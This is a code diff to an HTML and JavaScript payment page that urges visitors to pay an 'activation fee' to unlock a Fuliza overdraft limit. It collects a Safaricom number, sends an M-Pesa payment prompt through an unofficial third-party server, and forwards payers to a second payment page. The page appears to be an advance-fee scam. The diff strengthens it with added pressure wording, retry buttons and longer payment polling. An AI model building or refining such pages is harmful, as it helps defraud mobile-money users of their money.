@@ -9,7 +9,7 @@ body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
 .top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px;}
 .payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
 .info{margin:10px 0;font-size:16px;}
-input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;}
+input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;box-sizing:border-box;}
 .pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer;}
 .pay-btn:hover{background:#179937;}
 .spinner{margin-top:15px;display:none;}
@@ -27,7 +27,7 @@ input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radiu
 <h2>Activate Your Fuliza Limit Now</h2>
 
 <p class="encourage">
-Pay your activation fee today to unlock your desired Fuliza limit instantly. Your financial freedom is just one click away!
+Pay your activation fee today to unlock your desired Fuliza limit instantly. Ensure uninterrupted transactions and enjoy seamless access to your funds. Your financial freedom is just one click away!
 </p>
 
 <div class="info">Selected Limit: <strong id="limit"></strong></div>
@@ -39,6 +39,10 @@ Pay your activation fee today to unlock your desired Fuliza limit instantly. You
 
 <div class="spinner" id="spinner"><div class="loader"></div></div>
 <div class="message" id="message"></div>
+
+<p class="encourage">
+Make sure to complete the payment to enjoy your increased Fuliza limit immediately. This small investment secures your ability to transact freely without delays.
+</p>
 </div>
 
 <script>
@@ -48,7 +52,7 @@ document.getElementById("limit").innerText = "KSh " + selectedAmount;
 document.getElementById("fee").innerText = "KSh " + activationFee;
 
 function isSafaricom(number){
-  return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
+  return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number) || /^2541[0-9]{8}$/.test(number);
 }
 
 function formatPhone(number){
@@ -71,57 +75,71 @@ async function payNow(){
   msg.innerText="Initiating payment... please check your phone.";
   msg.style.color="black";
 
+  // Use local API if running locally, otherwise use the render deployed backend
+  const apiUrl = window.location.hostname === 'localhost' || window.location.protocol === 'file:' 
+    ? 'http://localhost:3000' 
+    : 'https://mpayafrica-server.onrender.com';
+
   try{
-    const res = await fetch("https://mpayafrica-server.onrender.com/pay",{
+    const res = await fetch(`${apiUrl}/stkpush`,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
       body: JSON.stringify({
         phone: phoneToSend,
-        amount: Number(activationFee)
+        amount: Number(activationFee),
+        reference: "FZA" + Date.now()
       })
     });
-
     const data = await res.json();
     spinner.style.display="none";
 
-    if(data.data && data.data.CheckoutRequestID){
-      const reference = data.data.CheckoutRequestID;
+    if(data.success){
       msg.innerText="STK Push sent ✅ Enter your M-Pesa PIN to confirm...";
       msg.style.color="green";
-      checkPayment(reference, "payment2.html");
+      checkPayment(data.reference || data.data?.reference, "payment2.html", apiUrl);
     } else {
-      msg.innerText="Payment failed: "+(data.error || "Please try again");
+      msg.innerText="Payment failed to initiate: " + (data.message || data.error || "Please try again");
       msg.style.color="red";
+      msg.innerHTML += `<br><button class="pay-btn" style="width:auto;padding:8px 16px;margin-top:10px" onclick="payNow()">Retry Payment</button>`;
     }
   } catch(err){
     spinner.style.display="none";
-    msg.innerText="Server error: "+(err.message || "Try again");
+    msg.innerText="Server error: " + (err.message || "Try again");
     msg.style.color="red";
+    msg.innerHTML += `<br><button class="pay-btn" style="width:auto;padding:8px 16px;margin-top:10px" onclick="payNow()">Retry Payment</button>`;
   }
 }
 
-async function checkPayment(reference, nextPage){
+async function checkPayment(reference, nextPage, apiUrl){
   const msg = document.getElementById("message");
   let attempts=0;
   const interval = setInterval(async ()=>{
     attempts++;
-    if(attempts>20){ clearInterval(interval); msg.innerText="Payment timeout. Please retry."; msg.style.color="red"; return; }
+    if(attempts>40){ 
+      clearInterval(interval); 
+      msg.innerText="Payment timeout. Please retry."; 
+      msg.style.color="red"; 
+      msg.innerHTML += `<br><button class="pay-btn" style="width:auto;padding:8px 16px;margin-top:10px" onclick="payNow()">Retry Payment</button>`;
+      return; 
+    }
     try{
-      const res = await fetch("https://mpayafrica-server.onrender.com/receipt/"+reference);
+      const res = await fetch(`${apiUrl}/receipt/${reference}`);
       const data = await res.json();
       if(data.success && data.receipt){
         const status = data.receipt.status.toLowerCase();
-        if(status==="completed" || status==="processing" || status==="loan_released"){
+        if(status==="success"){
           clearInterval(interval);
-          msg.innerText="Payment successful ✅ Redirecting...";
+          msg.innerText="Payment successful ✅ Redirecting to next step...";
           msg.style.color="green";
           setTimeout(()=>{window.location.href=nextPage},2000);
         }
-        if(status==="cancelled" || status==="stk_failed" || status==="error"){
+        else if(status==="failed" || status==="cancelled" || status==="error"){
           clearInterval(interval);
-          msg.innerText="Payment failed: "+(data.receipt.status_note || status);
+          msg.innerText="Payment failed: " + (data.receipt.status_note || "Transaction cancelled");
           msg.style.color="red";
+          msg.innerHTML += `<br><button class="pay-btn" style="width:auto;padding:8px 16px;margin-top:10px" onclick="payNow()">Retry Payment</button>`;
         }
+        // If "processing", it just continues the interval to poll again.
       }
     }catch(e){}
   },3000);
